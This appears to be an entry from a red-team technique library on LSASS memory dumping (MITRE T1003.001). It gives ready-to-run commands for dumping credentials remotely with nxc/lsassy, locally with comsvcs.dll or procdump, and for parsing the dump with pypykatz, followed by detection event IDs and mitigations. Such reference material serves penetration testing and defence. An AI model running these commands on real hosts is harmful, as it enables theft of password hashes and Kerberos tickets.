---
id: lsass_dump
type: technique
label: "LSASS memory dumping"
phase: "cred"
tools: ["mimikatz"]
cve: null
detect: "Sysmon EID 10 — process access to lsass.exe."
mitre: "T1003.001"
tag: null
---


# LSASS memory dumping

### Affected object / attribute
**LSASS process memory** on a host.

### Concept (deep)
LSASS holds NT hashes, Kerberos tickets, and (if WDigest) cleartext. Local admin can dump via `comsvcs.dll`/`procdump`; remote tooling (`lsassy`, `nanodump`) avoids dropping files.

### Commands
```bash
# ── Remote LSASS dump ────────────────────────────────────────────────
nxc smb 10.10.10.5 -u administrator -p 'Password123!' -M lsassy

# ── On host (comsvcs) ────────────────────────────────────────────────
rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
pypykatz lsa minidump lsass.dmp

# ── procdump ─────────────────────────────────────────────────────────
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Detection
**4656/4663** handle access to `lsass.exe`; **Sysmon 10** (`GrantedAccess 0x1010/0x1410`); enable **Credential Guard/LSA protection**.

---
